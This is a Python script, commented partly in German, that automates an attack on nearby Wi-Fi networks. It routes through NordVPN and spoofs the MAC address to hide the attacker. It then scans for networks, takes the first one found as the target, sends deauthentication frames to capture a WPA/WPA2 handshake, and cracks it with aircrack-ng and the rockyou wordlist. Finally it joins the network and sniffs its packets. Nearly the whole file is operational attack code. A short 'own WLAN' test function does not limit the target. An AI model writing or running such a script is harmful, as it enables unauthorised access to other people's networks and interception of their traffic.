import os
import re
import random
import subprocess
from scapy.all import *
from datetime import datetime


# NordVPN verbinden
def connect_vpn():
    vpn_server = random.choice(["us1234.nordvpn.com", "uk1234.nordvpn.com", "de1234.nordvpn.com"])
    subprocess.call(["nordvpn", "connect", vpn_server])
    print(f"Verbunden mit NordVPN-Server: {vpn_server}")


# MAC-Spoofing-Funktion
def change_mac_address(interface):
    new_mac = "02:00:00:%02x:%02x:%02x" % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
    subprocess.call(["sudo", "ifconfig", interface, "down"])
    subprocess.call(["sudo", "ifconfig", interface, "hw", "ether", new_mac])
    subprocess.call(["sudo", "ifconfig", interface, "up"])
    print(f"Neue MAC-Adresse: {new_mac}")


# WLAN-Scan zum Finden des Zielnetzwerks
def scan_networks(interface):
    print("Scanning for nearby networks...")
    networks = []

    def callback(packet):
        if packet.haslayer(Dot11Beacon):
            ssid = packet[Dot11Elt].info.decode()
            bssid = packet[Dot11].addr2
            if (ssid, bssid) not in networks:
                networks.append((ssid, bssid))
                print(f"Found Network: SSID: {ssid}, BSSID: {bssid}")

    sniff(iface=interface, prn=callback, timeout=10)
    return networks


# Deauthentication Attack to capture WPA/WPA2 handshake
def deauth_attack(interface, target_bssid):
    print(f"Starting deauth attack on {target_bssid}...")
    packet = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) / Dot11Deauth(
        reason=7)
    sendp(packet, iface=interface, count=100, inter=0.1)
    print("Deauth attack sent.")


# Crack WPA/WPA2 handshake using aircrack-ng
def crack_handshake(handshake_file, wordlist):
    print(f"Cracking handshake with aircrack-ng using wordlist {wordlist}...")
    result = subprocess.call(["aircrack-ng", "-w", wordlist, handshake_file])
    return result == 0


# Paketverarbeitungsfunktion
def packet_callback(packet):
    if packet.haslayer(IP):
        source_ip = packet[IP].src
        dest_ip = packet[IP].dst
        protocol = packet.sprintf("%IP.proto%")

        if packet.haslayer(Raw):
            payload = packet[Raw].load.decode(errors='ignore')
        else:
            payload = "No payload"

        # Echtzeit-Anzeige der abgefangenen Pakete
        print(f"Captured Packet - Src: {source_ip}, Dst: {dest_ip}, Proto: {protocol}, Payload: {payload}")


# WLAN-Sniffing starten
def start_sniffing(interface):
    print(f"Sniffing on interface {interface}")
    sniff(iface=interface, prn=packet_callback, store=0)


# Testfunktion für eigenes WLAN
def test_own_wlan(interface, ssid, password):
    print(f"Testing on own WLAN: {ssid}")
    # Verbindung zum eigenen WLAN herstellen
    os.system(f"nmcli dev wifi connect {ssid} password {password}")
    print(f"Connected to {ssid}")

    # WLAN-Sniffing starten
    start_sniffing(interface)


# Hauptprogramm
if __name__ == "__main__":
    interface = "wlan0"  # Beispiel für Linux

    # Mit NordVPN verbinden
    connect_vpn()

    # MAC-Spoofing vorbereiten
    os.system(f"sudo ifconfig {interface} down")
    os.system(f"sudo iwconfig {interface} mode monitor")
    os.system(f"sudo ifconfig {interface} up")

    # MAC-Adresse ändern
    change_mac_address(interface)

    # Modulartests an eigenem WLAN
    own_ssid = "EigeneSSID"
    own_password = "EigenePasswort"
    test_own_wlan(interface, own_ssid, own_password)

    # Netzwerke scannen
    networks = scan_networks(interface)
    if not networks:
        print("Keine Netzwerke gefunden.")
        exit()

    target_network = networks[0]  # Wähle das erste gefundene Netzwerk (Beispiel)
    target_ssid, target_bssid = target_network

    # Deauth-Attacke ausführen
    deauth_attack(interface, target_bssid)

    # Warten auf Handshake und speichern
    print("Waiting for handshake...")
    handshake_file = "/tmp/handshake.cap"
    subprocess.call(["airodump-ng", "-c", "6", "--bssid", target_bssid, "-w", handshake_file, interface])

    # WPA/WPA2-Handshake knacken
    wordlist = "/usr/share/wordlists/rockyou.txt"
    success = crack_handshake(handshake_file, wordlist)
    if success:
        print("Handshake successfully cracked. Connecting to target network...")

        # Mit dem Zielnetzwerk verbinden
        os.system(f"sudo iwconfig {interface} essid {target_ssid}")
        print(f"Connected to {target_ssid}")

        # WLAN-Sniffing starten
        start_sniffing(interface)
    else:
        print("Failed to crack handshake.")
